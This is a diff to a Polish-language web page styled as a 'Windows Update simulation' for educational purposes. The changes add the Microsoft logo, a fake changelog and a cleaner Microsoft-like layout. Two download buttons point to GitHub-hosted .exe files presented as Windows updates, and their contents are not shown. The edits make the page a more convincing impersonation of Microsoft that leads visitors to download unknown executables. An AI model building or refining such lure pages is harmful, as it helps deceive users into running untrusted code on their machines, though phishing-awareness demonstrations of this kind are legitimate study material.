@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Windows Update - Symulacja</title>
+  <title>Windows Update – Symulacja</title>
   <style>
     body {
       font-family: Segoe UI, sans-serif;
@@ -11,25 +11,40 @@
       margin: 0;
       padding: 0;
     }
+
     header {
-      background-color: #0078d4;
-      color: white;
+      background-color: #ffffff;
       padding: 20px;
-      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid #ddd;
     }
-    h1 {
+
+    header img {
+      height: 30px;
+      margin-right: 15px;
+    }
+
+    header h1 {
+      font-size: 24px;
+      color: #333;
       margin: 0;
-      font-size: 32px;
     }
-    p.sub {
-      margin: 5px 0 0;
-      font-size: 16px;
+
+    .sub {
+      text-align: center;
       font-style: italic;
+      font-size: 14px;
+      margin-top: 5px;
+      color: #666;
     }
+
     main {
       text-align: center;
       padding: 40px 20px;
     }
+
     .btn {
       display: inline-block;
       margin: 20px;
@@ -43,9 +58,32 @@
       cursor: pointer;
       transition: background-color 0.3s;
     }
+
     .btn:hover {
       background-color: #005a9e;
     }
+
+    .whats-new {
+      background-color: white;
+      max-width: 600px;
+      margin: 30px auto;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+      text-align: left;
+    }
+
+    .whats-new h2 {
+      color: #0078d4;
+      font-size: 22px;
+      margin-top: 0;
+    }
+
+    .whats-new ul {
+      padding-left: 20px;
+      line-height: 1.7;
+    }
+
     footer {
       text-align: center;
       font-size: 12px;
@@ -55,13 +93,26 @@
   </style>
 </head>
 <body>
+
   <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/48/Microsoft_logo.svg" alt="Microsoft Logo" />
     <h1>Symulacja Windows Update</h1>
-    <p class="sub">Strona demonstracyjna do celów edukacyjnych</p>
   </header>
+  <p class="sub">Strona demonstracyjna do celów edukacyjnych</p>
 
   <main>
-    <p>Wybierz jeden z poniższych plików do pobrania:</p>
+    <div class="whats-new">
+      <h2>🆕 Co nowego w tej wersji?</h2>
+      <ul>
+        <li>Poprawiona szybkość aktualizacji systemowych</li>
+        <li>Nowy, odświeżony wygląd panelu sterowania</li>
+        <li>Ulepszona obsługa ekranów dotykowych</li>
+        <li>Aktualizacja zabezpieczeń (maj 2025)</li>
+        <li>Tryb wydajności dla starszych laptopów</li>
+      </ul>
+    </div>
+
+    <p><strong>Wybierz wersję aktualizacji do pobrania:</strong></p>
     <a href="https://github.com/diesel1-8/webpage/raw/main/windowsupdatev1.exe" class="btn">🔽 Windows Update v1</a>
     <a href="https://github.com/diesel1-8/webpage/raw/main/windowsupdatev2.exe" class="btn">🔽 Windows Update v2</a>
   </main>
